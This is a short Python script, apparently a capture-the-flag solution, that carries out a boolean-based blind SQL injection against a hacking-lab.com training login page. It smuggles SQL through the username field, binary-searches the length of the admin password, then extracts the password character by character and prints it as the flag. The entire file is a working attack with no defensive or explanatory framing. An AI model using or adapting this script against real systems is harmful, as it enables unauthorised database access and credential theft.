#!/usr/bin/python3

import requests
import string

s_space = string.digits + string.ascii_lowercase + string.ascii_uppercase + string.punctuation

#assumes account t:t exists
def check_inj(st):
    print(st)
    r = requests.post("https://blind.idocker.hacking-lab.com/index.php", data={'username':"t' AND " + st +" --", 'password':'t'})
    return "as t" in r.text


def get_len():
    lmiddle = -1
    found = False
    mi = 0
    middle = 25
    ma = 50
    while(not found):
        if(check_inj(str(middle) + "> (SELECT length(password) FROM users WHERE name = 'admin')")):
            ma = middle
            if(middle == lmiddle):
                return mi
        else:
            mi = middle
            if(middle == lmiddle):
                return middle

        lmiddle = middle
        middle = (mi + ma) // 2

def check_char(index):
    lmiddle = -1
    mi = 33
    ma = 126
    middle = ma//2

    while(True):
        if(check_inj("'" + chr(middle) + "' " + "> (SELECT substr(password, " + str(index) + ", 1) FROM users WHERE name='admin')")):
            ma = middle
            if(middle == lmiddle):
                return ma
        else:
            mi = middle
            if(middle == lmiddle):
                return mi

        lmiddle = middle
        middle = (mi + ma) // 2
        
        print("STATS")
        print(mi, ma, middle)


str_len = get_len()
print("FLAG LEN: " + str(str_len))

flag = ""
while(len(flag) != str_len):
    flag += chr(check_char(len(flag) + 1))
    print(flag)
